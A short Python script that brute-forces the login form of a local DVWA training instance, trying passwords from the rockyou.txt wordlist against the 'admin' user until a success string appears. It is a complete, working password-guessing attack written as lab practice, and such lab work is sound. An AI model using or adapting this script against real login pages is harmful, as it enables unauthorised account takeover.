import requests
import sys

target = "http://127.0.0.1:42001/vulnerabilities/brute/"
usernames = ["admin"]
password = "rockyou.txt"
needle = "welcome"

for username in usernames:
	with open(password, 'r') as password_lists:
		for password in password_lists:
			password = password.strip("\n").encode()
			sys.stdout.write(" Attempting user:password -> {}:{}\r".format(username,password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username":username , "password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("-t [>>>>>] Valid Password '{}' found for ser '{}'!".format(password.decode(),username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found")
#dvwa-start
